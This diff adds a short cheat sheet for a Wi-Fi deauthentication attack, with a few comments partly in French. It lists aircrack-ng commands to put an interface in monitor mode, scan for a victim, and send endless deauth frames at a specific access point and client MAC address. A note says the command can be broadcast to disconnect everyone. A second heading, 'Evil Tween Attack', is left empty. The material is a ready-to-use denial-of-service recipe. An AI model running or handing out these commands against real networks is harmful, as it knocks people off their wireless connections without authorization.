@@ -1,0 +1,18 @@
+#############################################
+Deauth attack
+#############################################
+
+# Enable monitor mode interface
+sudo airmon-ng start wlp2s0
+
+# Start capturing datas (find victim MAC with connect to the AP MAC and then switch wlp2s0 channel with the command below + "--channel x"
+# https://defkey.com/airodump-ng-shortcuts
+sudo airodump-ng wlp2s0mon
+
+# Send infinte deauth req to the AP from the target (si on ne spécifie pas le c, on déauth tlm (broadcast))
+sudo aireplay-ng -0 0 -a  F0:3E:90:6E:6F:18 -c A0:C9:A0:EB:E8:AA wlp2s0mon
+
+#############################################
+Evil Tween Attack
+#############################################
+
